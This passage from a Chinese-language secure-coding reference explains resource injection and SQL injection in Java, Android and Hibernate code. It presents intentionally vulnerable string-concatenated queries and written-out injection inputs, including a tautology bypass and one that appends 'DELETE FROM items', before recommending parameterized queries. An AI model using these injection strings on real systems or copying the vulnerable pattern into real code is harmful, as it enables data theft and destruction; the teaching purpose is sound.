<h5 id="RECOMMENDATIONS-311"><a href="#RECOMMENDATIONS-311" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>阻止 resource injection 的最佳做法是采用一些间接手段。例如创建一份合法资源名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户就不能直接由自己来指定资源的名称了。</p>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大、难以跟踪。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<h5 id="REFERENCES-310"><a href="#REFERENCES-310" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 99</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[6] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><h5 id="ABSTRACT-313"><a href="#ABSTRACT-313" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过不可信来源的输入构建动态 SQL 指令，攻击者就能够修改指令的含义或者执行任意 SQL 命令。</p>
<h5 id="EXPLANATION-314"><a href="#EXPLANATION-314" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL injection 错误在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造一个 SQL 查询。</p>
</li>
</ol>
<p>例 1：以下代码动态地构造并执行了一个 SQL 查询，该查询可以搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">	String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">	String query = &quot;SELECT * FROM items WHERE owner = &apos;&quot;</span><br><span class="line"></span><br><span class="line">				+ userName + &quot;&apos; AND itemname = &apos;&quot;</span><br><span class="line"></span><br><span class="line">				+ itemName + &quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">	ResultSet rs = stmt.execute(query);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这一代码所执行的查询遵循如下方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &lt;userName&gt;</span><br><span class="line"></span><br><span class="line">AND itemname = &lt;itemName&gt;;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name’ OR ‘a’=’a”，那么查询就会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos; OR &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>附加条件 OR ‘a’=’a’ 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items;</span><br></pre></td></tr></table></figure>
<p>这种查询的简化会使攻击者绕过查询只返回经过验证的用户所拥有的条目的要求；而现在的查询则会直接返回所有储存在 items 表中的条目，不论它们的所有者是谁。</p>
<p>例 2：这个例子指出了将不同的恶意数值传递给在例 1 中构造和执行的查询时所带来的各种影响。如果一个用户名为 wiley 在 itemName 中输入字符串“name’; DELETE FROM items; –”，则该查询将会变为以下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--&apos;</span><br></pre></td></tr></table></figure>
<p>众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。</p>
<p>注意成对的连字符 (–)；这在大多数数据库服务器上都表示下面的语句将作为注释使用，而不能加以执行 [4]。在这种情况下，注释字符的作用就是删除修改的查询指令中遗留的最后一个单引号。而在那些不允许这样加注注释的数据库中，通常攻击者可以如例 1 那样来攻击。如果攻击者输入字符串“name’); DELETE FROM items; SELECT * FROM items WHERE ‘a’=’a”就会创建如下三个有效指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM items WHERE &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 SQL injection）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>示例 3：以下代码对示例 1 进行调整，使其适用于 Android 平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        PasswordAuthentication pa = authenticator.getPasswordAuthentication();</span><br><span class="line"></span><br><span class="line">        String userName = pa.getUserName();</span><br><span class="line"></span><br><span class="line">        String itemName = this.getIntent().getExtras().getString(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">        String query = &quot;SELECT * FROM items WHERE owner = &apos;&quot;</span><br><span class="line"></span><br><span class="line">                                + userName + &quot;&apos; AND itemname = &apos;&quot;</span><br><span class="line"></span><br><span class="line">                                + itemName + &quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">        SQLiteDatabase db = this.openOrCreateDatabase(&quot;DB&quot;, MODE_PRIVATE, null);</span><br><span class="line"></span><br><span class="line">        Cursor c = db.rawQuery(query, null);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：</p>
<p>— 把没有被黑名单引用的值作为目标</p>
<p>— 寻找方法以绕过对某一转义序列元字符的需要</p>
<p>— 使用存储过程来隐藏注入的元字符</p>
<p>手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。</p>
<p>防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。所以再次强调，存储过程在某些情况下可以避免这种攻击，但是并不能完全保护您的应用系统抵御 SQL injection 的攻击。</p>
<h5 id="RECOMMENDATIONS-312"><a href="#RECOMMENDATIONS-312" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。</p>
<p>可以将例 1 改写成使用参数化 SQL 指令（替代用户输入连续的字符串），如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">	String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">	String query = &quot;SELECT * FROM items WHERE itemname=? AND owner=?&quot;;</span><br><span class="line"></span><br><span class="line">	PreparedStatement stmt = conn.prepareStatement(query);</span><br><span class="line"></span><br><span class="line">	stmt.setString(1, itemName);</span><br><span class="line"></span><br><span class="line">	stmt.setString(2, userName);</span><br><span class="line"></span><br><span class="line">	ResultSet results = stmt.execute();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>下面是 Android 的等同内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	PasswordAuthentication pa = authenticator.getPasswordAuthentication();</span><br><span class="line"></span><br><span class="line">	String userName = pa.getUserName();</span><br><span class="line"></span><br><span class="line">	String itemName = this.getIntent().getExtras().getString(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">	String query = &quot;SELECT * FROM items WHERE itemname=? AND owner=?&quot;;</span><br><span class="line"></span><br><span class="line">	SQLiteDatabase db = this.openOrCreateDatabase(&quot;DB&quot;, MODE_PRIVATE, null);</span><br><span class="line"></span><br><span class="line">	Cursor c = db.rawQuery(query, new Object[]&#123;itemName, userName&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<h5 id="REFERENCES-311"><a href="#REFERENCES-311" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] S. J. Friedl SQL Injection Attacks by Example</p>
<p>[2] P. Litwin Stop SQL Injection Attacks Before They Stop You MSDN Magazine</p>
<p>[3] P. Finnigan SQL Injection and Oracle, Part One Security Focus</p>
<p>[4] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[5] IDS00-J. Prevent SQL Injection CERT</p>
<p>[6] INJECT-2: Avoid dynamic SQL Oracle</p>
<p>[7] INPUT-1: Validate inputs Oracle</p>
<p>[8] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[9] Standards Mapping - FIPS200 SI</p>
<p>[10] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[11] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[14] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[15] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[16] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[17] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[24] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[25] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[26] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="SQL-Injection-Hibernate"><a href="#SQL-Injection-Hibernate" class="headerlink" title="SQL Injection: Hibernate"></a>SQL Injection: Hibernate</h4><h5 id="ABSTRACT-314"><a href="#ABSTRACT-314" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 Hibernate 来执行通过不可信来源的输入构建的动态 SQL 语句会使得攻击者能够篡改语句的含义或者执行任意 SQL 命令。</p>
<h5 id="EXPLANATION-315"><a href="#EXPLANATION-315" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL injection 错误在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>该数据用于动态地构造一个 HQL 查询。</p>
</li>
</ol>
<p>示例 1：以下代码动态地构造并执行一个 HQL 查询，用于搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">	String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">	String query = &quot;FROM items WHERE owner = &apos;&quot;</span><br><span class="line"></span><br><span class="line">				+ userName + &quot;&apos; AND itemname = &apos;&quot;</span><br><span class="line"></span><br><span class="line">				+ itemName + &quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">	List items = sess.createQuery(query).list();</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>这一代码所执行的查询遵循如下方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &lt;userName&gt;</span><br><span class="line"></span><br><span class="line">AND itemname = &lt;itemName&gt;;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name’ OR ‘a’=’a”，那么查询就会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos; OR &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>附加条件 OR ‘a’=’a’ 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items;</span><br></pre></td></tr></table></figure>
<p>这种查询的简化会使攻击者绕过查询只返回经过验证的用户所拥有的条目的要求；而现在的查询则会直接返回所有储存在 items 表中的条目，不论它们的所有者是谁。</p>
<p>例 2：这个例子指出了将不同的恶意数值传递给在例 1 中构造和执行的查询时所带来的各种影响。如果一个用户名为 wiley 在 itemName 中输入字符串“name’; DELETE FROM items; –”，则该查询将会变为以下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line">--&apos;</span><br></pre></td></tr></table></figure>
<p>众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。</p>
<p>注意成对的连字符 (–)；这在大多数数据库服务器上都表示下面的语句将作为注释使用，而不能加以执行 [4]。在这种情况下，注释字符的作用就是删除修改的查询指令中遗留的最后一个单引号。而在那些不允许这样加注注释的数据库中，通常攻击者可以如例 1 那样来攻击。如果攻击者输入字符串“name’); DELETE FROM items; SELECT * FROM items WHERE ‘a’=’a”就会创建如下三个有效指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM items WHERE &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：</p>
<p>— 把没有被黑名单引用的值作为目标</p>
<p>— 寻找方法以绕过对某一转义序列元字符的需要</p>
<p>— 使用存储过程来隐藏注入的元字符</p>
<p>手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。</p>
<p>防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。再次重申，存储过程可以阻止某些类型的盗取行为，但是它们并不能保护您的应用程序免受 SQL Injection 攻击。</p>
<h5 id="RECOMMENDATIONS-313"><a href="#RECOMMENDATIONS-313" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。</p>
<p>前面的例子可以改成使用参数化 SQL 指令的攻击方式（替代用户输入连续的字符串），如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">String query =</span><br><span class="line"></span><br><span class="line">        &quot;FROM items WHERE itemname=? AND owner=?&quot;;</span><br><span class="line"></span><br><span class="line">Query stmt = sess.createQuery(query);</span><br><span class="line"></span><br><span class="line">stmt.setString(0, itemName);</span><br><span class="line"></span><br><span class="line">stmt.setString(1, userName);</span><br><span class="line"></span><br><span class="line">List items = stmt.list();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<p>如果输入必须直接包含在指令中，就应当使用绑定参数。</p>
